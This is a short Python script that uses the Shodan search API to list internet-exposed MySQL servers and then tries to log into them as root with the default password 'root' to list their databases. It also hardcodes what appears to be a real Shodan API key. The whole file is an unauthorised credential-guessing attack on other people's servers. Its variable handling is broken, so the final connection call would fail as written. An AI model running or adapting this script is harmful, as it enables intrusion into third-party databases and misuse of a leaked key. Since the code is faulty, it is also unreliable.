from curses import echo
from pprint import pprint
from sqlite3 import connect
import var_dump
import shodan
import mysql.connector
import time
import sys

#shodan API key
SHODAN_API_KEY = "fD1T4vSYKQaQrtwuGy0Ya4odIOJ1eYs9"
api = shodan.Shodan(SHODAN_API_KEY)

#search for open access mysql servers
class Exploit:
    def search():
        try:
            results = api.search('mysql')
            print('Results found: %s' % results['total'])
            for result in results['matches']:
                print('IP: %s' % result['ip_str'])
                IP = result['ip_str']
                print('Port: %s' % result['port'])
                PORT = result['port']
                print('Organization: %s' % result['org'])
                ORG = result['org']
                print('Country: %s' % result['location']['country_name'])
                COUNTRY = result['location']['country_name']
                print('\n')
        except shodan.APIError as e:
            print('Error: %s' % e)
            pass
        
            
#now connect with standard credits
    def connect_db_mysql(IP, PORT, ORG, COUNTRY):      
        time.sleep(4)
        print("Connecting to weak databases...")  
        try:
            conn = mysql.connector.connect(host=IP, port=PORT, user='root', password='root')
            cursor = conn.cursor()
            cursor.execute("SHOW DATABASES;")
            for db in cursor:
                print(db)
        except mysql.connector.Error as err:
            print(err)

        finally:
            cursor.close()
            conn.close()



Exploit.search()
Exploit.connect_db_mysql(IP, PORT, ORG, COUNTRY)